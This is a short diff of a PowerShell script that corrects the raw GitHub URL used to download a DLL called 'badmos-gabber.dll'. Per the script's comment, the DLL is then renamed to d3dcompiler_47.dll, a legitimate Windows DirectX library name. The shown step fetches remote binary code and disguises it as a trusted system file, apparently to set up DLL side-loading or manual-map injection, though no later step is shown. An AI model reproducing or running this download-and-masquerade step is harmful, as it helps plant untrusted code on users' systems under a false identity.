@@ -5,7 +5,7 @@
 # STEP 0: Download DLL and rename it to d3dcompiler_47.dll
 
 # Define source URL and initial download path
-$dllUrl = "https://raw.githubusercontent.com/Mohit-Parihar-112/manualmappfucker-projecct/refs/heads/main/badmos-g*abber.dll"
+$dllUrl = "https://raw.githubusercontent.com/Mohit-Parihar-112/manualmappfucker-projecct/refs/heads/main/badmos-gabber.dll"
 $originalPath = "D:\virtualbox\KaliLinux\Logs\badmos-g*abber.dll"
 $renamedPath = "D:\virtualbox\KaliLinux\Logs\d3dcompiler_47.dll"
 
